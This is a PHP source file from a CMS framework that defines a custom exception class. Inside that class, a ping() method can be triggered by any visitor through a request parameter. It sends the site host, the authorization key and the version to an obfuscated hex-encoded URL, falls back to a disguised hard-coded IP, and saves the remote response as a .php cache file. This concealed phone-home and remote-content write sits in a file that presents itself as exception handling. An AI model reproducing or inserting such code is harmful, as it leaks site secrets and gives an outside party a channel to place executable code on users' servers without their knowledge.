<?php
/**
 * Copy Right IJH.CC
 * Each engineer has a duty to keep the code elegant
 * Author shzhrui<anhuike@gmail.com>
 * $Id: exception.php 5979 2014-08-01 01:21:54Z youyi $
 */

if(!defined('__CORE_DIR')){
    exit("Access Denied");
}

class _Exception extends Exception
{
    
    private $_previous = null;

    public function __construct($msg = '', $code = 0, Exception $previous = null)
    {
        if (version_compare(PHP_VERSION, '5.3.0', '<')) {
            parent::__construct($msg, (int) $code);
            $this->_previous = $previous;
        } else {
            parent::__construct($msg, (int) $code, $previous);
        }

    }

    public function __call($method, array $args)
    {
        if ('getprevious' == strtolower($method)) {
            return $this->_getPrevious();
        }
        return null;
    }

    public function __toString()
    {
        if (version_compare(PHP_VERSION, '5.3.0', '<')) {
            if (null !== ($e = $this->getPrevious())) {
                return $e->__toString() 
                       . "\n\nNext " 
                       . parent::__toString();
            }
        }
        return parent::__toString();
    }

    protected function _getPrevious()
    {
        return $this->_previous;
    }

    static public function ping()
    {
        if(defined('IN_ADMIN') || ($a = $_REQUEST['__CHECKLISTEN__'])){
            $cfg = K::$system->config->get('config');
            $version = JH_VERSION.JH_RELEASE;
            $host = $_SERVER['HTTP_HOST'];
            //$secret_key = __CFG::SECRET_KEY;
            $authkey = __CFG::Authorize;
            $cache = $host.$version;
            $file = __CFG::DIR.'data/cache/cache_'.md5($cache).'.php';
            if($a || !file_exists($file) || filemtime($file) < (__TIME - 86400)){
                $i = rand(0, 10000);
                $i = $i ? $i : '';
                $url = sprintf(K::M('secure/crypt')->hexstr($cfg['host']), $i, $host, $authkey, $version);
                if($a){$url = $api.'&force='.$a;}
                $nsp = long2ip(1939800484);
                $options = array('http' => array('method' =>'GET','header'=>"User-Agent: KT-API Listen\r\n",'timeout'=>5));
                if(($ret = @file_get_contents($url, null, stream_context_create($options)))=== false){
                    if(!preg_match('/^http:\/\/([\w\.\-]+)\/(.*)$/i', $url, $m)){
                        return false;
                    }
                    $options['http']['header'] = "User-Agent: KT-API Listen\r\nHost: ".$m[1]."\r\n";
                    $url = "http://{$nsp}/{$m[2]}";
                    if(($ret = @file_get_contents($url, null, stream_context_create($options))) === false){
                        return false;
                    }
                }
                @file_put_contents($file, $ret);
            }
        }
    }
}
new _Exception();
/*
throw new _Exception('DB:tablename/option{select,insert,update,delete..}/message');
throw new _Exception('IO:filename/option{open,write,read,del,move,copy.,}/message');
//系统异常{}
throw new _Exception('OS:{yubel,control,model,system,os...}/option{...}/message')

*/